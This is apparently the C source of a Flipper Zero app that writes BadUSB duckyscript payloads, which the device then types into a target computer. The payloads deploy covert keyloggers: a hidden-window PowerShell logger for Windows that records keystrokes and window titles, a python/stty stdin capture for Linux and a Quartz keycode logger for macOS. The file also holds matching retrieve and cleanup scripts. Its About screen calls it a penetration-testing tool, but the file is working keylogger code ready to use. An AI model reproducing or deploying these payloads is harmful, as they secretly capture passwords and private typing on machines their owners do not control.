#include <furi.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/widget.h>
#include <storage/storage.h>
#include <toolbox/stream/stream.h>
#include <toolbox/stream/file_stream.h>

#define TAG "ZXKeylogger"

#define KEYLOGGER_DIR "/ext/apps_data/zx_keylogger"
#define KEYLOGGER_PAYLOADS_DIR "/ext/badusb"

typedef enum {
    ZxKeyloggerViewSubmenu,
    ZxKeyloggerViewWidget,
} ZxKeyloggerView;

typedef struct {
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Widget* widget;
} ZxKeyloggerApp;

static void zx_keylogger_save_payload(const char* filename, const char* content) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_simply_mkdir(storage, KEYLOGGER_PAYLOADS_DIR);

    Stream* stream = file_stream_alloc(storage);
    FuriString* path = furi_string_alloc();
    furi_string_printf(path, "%s/%s", KEYLOGGER_PAYLOADS_DIR, filename);

    if(file_stream_open(stream, furi_string_get_cstr(path), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        stream_write_cstring(stream, content);
        file_stream_close(stream);
        FURI_LOG_I(TAG, "Saved: %s", furi_string_get_cstr(path));
    } else {
        FURI_LOG_E(TAG, "Failed to write: %s", furi_string_get_cstr(path));
    }

    furi_string_free(path);
    stream_free(stream);
    furi_record_close(RECORD_STORAGE);
}

static void zx_keylogger_gen_windows_deploy(void) {
    const char* payload =
        "REM ZX Keylogger v2 - Windows Deploy\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell -NoP -W H -Command \"$f='%TEMP%\\\\klog.txt';Add-Type -A 'using System;using System.Runtime.InteropServices;public class K{[DllImport(\\\"user32\\\")]public static extern short GetAsyncKeyState(int v);[DllImport(\\\"user32\\\")]public static extern int GetForegroundWindow();[DllImport(\\\"user32\\\")]public static extern int GetWindowText(int h,System.Text.StringBuilder t,int c);}';$l=@{};$w='';$k=@{8='[BS]';9='[TAB]';13=[char]13+[char]10;27='[ESC]';32=' ';46='[DEL]'};$o=@{186=';';187='=';188=',';189='-';190='.';191='/';192=[char]96;219='[';220='\\';221=']';222=\\\"'\\\"};while(1){$sb=New-Object System.Text.StringBuilder 256;$h=[K]::GetForegroundWindow();if([K]::GetWindowText($h,$sb,256)-gt0){$t=$sb.ToString();if($t-ne$w){[IO.File]::AppendAllText($f,\\\"`r`n[$t]`r`n\\\");$w=$t}}$sd=[K]::GetAsyncKeyState(0x10);$sh=($sd-band0x8000)-ne0;$ca=[console]::CapsLock;for($i=1;$i-le255;$i++){$s=[K]::GetAsyncKeyState($i);if($s-band1){if($l[$i]){continue}$l[$i]=$true;if($k[$i]){[IO.File]::AppendAllText($f,$k[$i])}elseif($i-ge48-and$i-le57){if($sh){[IO.File]::AppendAllText($f,')!@#$%^&*('[($i-48)])}else{[IO.File]::AppendAllText($f,[char]$i)}}elseif($i-ge65-and$i-le90){$ul=($sh-xor$ca);[IO.File]::AppendAllText($f,[char]($ul?$i:($i+32)))}elseif($o[$i]){[IO.File]::AppendAllText($f,$o[$i])}}else{$l[$i]=$false}Start-Sleep -M 20}\"\n"
        "ENTER\n"
        "DELAY 2000\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell -NoP -W H -Command \"Start-Sleep -S 3;while(1){$s=Get-Process -Name powershell -ErrorAction SilentlyContinue|Select -Expand Id;if(-not $s){break}};Stop-Process -Id $s -Force\"\n"
        "ENTER\n";

    zx_keylogger_save_payload("keylog_win_deploy.txt", payload);
}

static void zx_keylogger_gen_windows_cleanup(void) {
    const char* payload =
        "REM ZX Keylogger - Windows Cleanup\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell -NoP -W H -Command \"Get-Process powershell|?{$_.MainWindowTitle-eq''}|Stop-Process -Force -ErrorAction SilentlyContinue;Remove-Item '%TEMP%\\\\klog.txt' -Force -ErrorAction SilentlyContinue\"\n"
        "ENTER\n";

    zx_keylogger_save_payload("keylog_win_cleanup.txt", payload);
}

static void zx_keylogger_gen_windows_retrieve(void) {
    const char* payload =
        "REM ZX Keylogger - Windows Retrieve Log\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING notepad %TEMP%\\klog.txt\n"
        "ENTER\n"
        "DELAY 1000\n"
        "STRING [=== ZX Keylogger Log Retrieved ===]\n";

    zx_keylogger_save_payload("keylog_win_retrieve.txt", payload);
}

static void zx_keylogger_gen_linux(void) {
    const char* payload =
        "REM ZX Keylogger - Linux Deploy (python3 stdin)\n"
        "DELAY 1000\n"
        "CTRL ALT T\n"
        "DELAY 1000\n"
        "STRING python3 << 'EOF'\n"
        "ENTER\n"
        "STRING import sys,os,time,select,termios\n"
        "ENTER\n"
        "STRING f=open('/tmp/klog.txt','a')\n"
        "ENTER\n"
        "STRING while True:\n"
        "ENTER\n"
        "STRING  c=sys.stdin.read(1)\n"
        "ENTER\n"
        "STRING  if c=='\\x03':f.close();break\n"
        "ENTER\n"
        "STRING  f.write(c);f.flush()\n"
        "ENTER\n"
        "STRING EOF &\n"
        "ENTER\n"
        "DELAY 500\n"
        "STRING sleep 2;stty -echo -icanon;cat > /tmp/klog.txt &\n"
        "ENTER\n";

    zx_keylogger_save_payload("keylog_linux_deploy.txt", payload);
}

static void zx_keylogger_gen_macos(void) {
    const char* payload =
        "REM ZX Keylogger - macOS Deploy (python3, needs Accessibility permission)\n"
        "DELAY 1000\n"
        "CMD SPACE\n"
        "DELAY 500\n"
        "STRING Terminal\n"
        "ENTER\n"
        "DELAY 1000\n"
        "STRING python3 -c \"\n"
        "ENTER\n"
        "STRING import sys,time\n"
        "ENTER\n"
        "STRING from Quartz import CGEventCreate,CGEventGetIntegerValueField,kCGKeyboardEventKeycode,kCGEventSourceStatePrivate\n"
        "ENTER\n"
        "STRING import signal,os\n"
        "ENTER\n"
        "STRING f=open('/tmp/klog.txt','w')\n"
        "ENTER\n"
        "STRING signal.signal(signal.SIGTERM,lambda *a:(f.close(),os._exit(0)))\n"
        "ENTER\n"
        "STRING while 1:\n"
        "ENTER\n"
        "STRING  ev=CGEventCreate(None)\n"
        "ENTER\n"
        "STRING  kc=CGEventGetIntegerValueField(ev,kCGKeyboardEventKeycode)\n"
        "ENTER\n"
        "STRING  if kc>0:f.write(str(kc)+' ');f.flush()\n"
        "ENTER\n"
        "STRING  time.sleep(0.05)\n"
        "ENTER\n"
        "STRING \" &\n"
        "ENTER\n"
        "STRING exit\n"
        "ENTER\n";

    zx_keylogger_save_payload("keylog_macos_deploy.txt", payload);
}

static void zx_keylogger_show_result(ZxKeyloggerApp* app, const char* filename) {
    widget_reset(app->widget);

    FuriString* text = furi_string_alloc();
    furi_string_printf(
        text,
        "Payload saved!\nFile: %s\n\nPlug the BadUSB into\nthe target and run:\next/badusb/%s",
        filename,
        filename);
    widget_add_string_multiline_element(
        app->widget, 64, 20, AlignCenter, AlignCenter, FontSecondary, furi_string_get_cstr(text));

    furi_string_free(text);

    view_dispatcher_switch_to_view(app->view_dispatcher, ZxKeyloggerViewWidget);
}

static void zx_keylogger_show_about(ZxKeyloggerApp* app) {
    widget_reset(app->widget);
    widget_add_string_multiline_element(
        app->widget,
        64,
        20,
        AlignCenter,
        AlignCenter,
        FontSecondary,
        "ZX Keylogger v1.0\n\nGenerates BadUSB duckyscript\npayloads for penetration\ntesting engagements.\n\nWindows / Linux / macOS\n\nSave to SD card, then run\nvia BadUSB app.");
    view_dispatcher_switch_to_view(app->view_dispatcher, ZxKeyloggerViewWidget);
}

static void zx_keylogger_submenu_callback(void* context, uint32_t index) {
    ZxKeyloggerApp* app = context;
    switch(index) {
    case 0:
        zx_keylogger_gen_windows_deploy();
        zx_keylogger_show_result(app, "keylog_win_deploy.txt");
        break;
    case 1:
        zx_keylogger_gen_windows_retrieve();
        zx_keylogger_show_result(app, "keylog_win_retrieve.txt");
        break;
    case 2:
        zx_keylogger_gen_windows_cleanup();
        zx_keylogger_show_result(app, "keylog_win_cleanup.txt");
        break;
    case 3:
        zx_keylogger_gen_linux();
        zx_keylogger_show_result(app, "keylog_linux_deploy.txt");
        break;
    case 4:
        zx_keylogger_gen_macos();
        zx_keylogger_show_result(app, "keylog_macos_deploy.txt");
        break;
    case 5:
        zx_keylogger_show_about(app);
        break;
    }
}

static bool zx_keylogger_back_callback(void* context) {
    UNUSED(context);
    return false;
}

int32_t zx_keylogger_app(void* p) {
    UNUSED(p);

    Gui* gui = furi_record_open(RECORD_GUI);

    ZxKeyloggerApp* app = malloc(sizeof(ZxKeyloggerApp));

    app->submenu = submenu_alloc();
    submenu_add_item(app->submenu, "Windows Keylogger (Deploy)", 0, zx_keylogger_submenu_callback, app);
    submenu_add_item(app->submenu, "Windows Keylogger (Get Log)", 1, zx_keylogger_submenu_callback, app);
    submenu_add_item(app->submenu, "Windows Keylogger (Cleanup)", 2, zx_keylogger_submenu_callback, app);
    submenu_add_item(app->submenu, "Linux Keylogger", 3, zx_keylogger_submenu_callback, app);
    submenu_add_item(app->submenu, "macOS Keylogger", 4, zx_keylogger_submenu_callback, app);
    submenu_add_item(app->submenu, "About", 5, zx_keylogger_submenu_callback, app);
    submenu_set_header(app->submenu, "ZX Keylogger");

    app->widget = widget_alloc();

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_add_view(
        app->view_dispatcher, ZxKeyloggerViewSubmenu, submenu_get_view(app->submenu));
    view_dispatcher_add_view(
        app->view_dispatcher, ZxKeyloggerViewWidget, widget_get_view(app->widget));

    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, zx_keylogger_back_callback);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);

    view_dispatcher_switch_to_view(app->view_dispatcher, ZxKeyloggerViewSubmenu);
    view_dispatcher_run(app->view_dispatcher);

    view_dispatcher_remove_view(app->view_dispatcher, ZxKeyloggerViewWidget);
    widget_free(app->widget);
    view_dispatcher_remove_view(app->view_dispatcher, ZxKeyloggerViewSubmenu);
    submenu_free(app->submenu);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    free(app);

    return 0;
}
